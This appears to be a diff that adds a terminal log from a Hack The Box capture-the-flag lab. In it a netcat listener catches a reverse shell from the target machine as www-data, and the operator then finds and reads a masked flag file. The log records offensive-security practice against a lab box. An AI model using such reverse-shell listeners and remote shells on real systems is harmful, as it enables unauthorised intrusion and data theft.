@@ -1,0 +1,15 @@
+┌──(kali㉿kali)-[~/…/hack_the_box/starting_point/tier1/Three]
+└─$ sudo nc -lvnp 443         
+listening on [any] 443 ...
+connect to [10.10.15.199] from (UNKNOWN) [10.129.29.185] 39570
+Linux three 4.15.0-189-generic #200-Ubuntu SMP Wed Jun 22 19:53:37 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
+ 03:36:35 up  3:32,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+sh: 0: can't access tty; job control turned off
+$ locate flag.txt
+locate flag.txt
+/var/www/flag.txt
+$ cat /var/www/flag.txt
+cat /var/www/flag.txt
+****************************
